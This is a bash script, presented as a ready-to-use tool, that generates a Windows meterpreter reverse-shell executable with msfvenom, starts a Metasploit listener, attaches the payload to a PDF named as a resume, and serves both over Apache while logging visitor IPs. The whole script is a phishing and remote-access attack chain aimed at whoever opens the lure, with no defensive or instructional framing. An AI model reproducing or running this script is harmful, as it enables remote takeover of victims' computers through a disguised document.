#!/bin/bash

# Validate user input
if [[ $# -eq 0 ]] || [[ $# -gt 1 ]]; then
    echo "Usage: $0 <PDF file>"
    exit 1
fi

if [ ! -f "$1" ]; then
    echo "Error: File not found: $1"
    exit 1
fi

# Set the local IP address
LOCAL_IP=$(hostname -I | awk '{print $1}')

# Set the payload name
PAYLOAD_NAME="payload_$(date +%s).exe"

# Set the Metasploit options
LHOST=$LOCAL_IP
LPORT=11506

# Generate the payload using msfvenom
echo "Generating payload..."
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "/var/www/html/downloads/$PAYLOAD_NAME"

# Set the file permissions for the payload
echo "Setting file permissions..."
sudo chmod 644 "/var/www/html/downloads/$PAYLOAD_NAME"

# Start the Metasploit listener
echo "Starting Metasploit listener..."
gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"

# Create a temporary directory for the files
WORKDIR=$(mktemp -d)

# Inject the executable file into the PDF using pdftk
if ! pdftk "$1" attach_files "/var/www/html/downloads/$PAYLOAD_NAME" to_page 1 output "$WORKDIR/resume_payload.pdf"; then
    echo "Error: Could not inject payload into PDF file." >&2
    rm -rf "$WORKDIR"
    exit 1
fi

# Move the PDF with the injected payload to the web server's directory
mv "$WORKDIR/resume_payload.pdf" "/var/www/html/downloads/"

# Define the start_server function
start_server() {
  echo "Web server started at http://$LOCAL_IP/"
  echo "To download the payload, visit http://$LOCAL_IP/downloads/$PAYLOAD_NAME"
  echo "To download the PDF with the payload, visit http://$LOCAL_IP/downloads/resume_payload.pdf"

  # Start Apache web server
  sudo systemctl start apache2

  # Continuously print the access log to the terminal
  echo "Visitors:"
  sudo tail -f /var/log/apache2/access.log | awk '{print $1}'
}

# Start the web server and print the access log to the terminal
start_server

# Stop the web server and Metasploit listener when the script is terminated
trap 'echo "Stopping web server and Metasploit listener..."; sudo systemctl stop apache2; exit' SIGINT
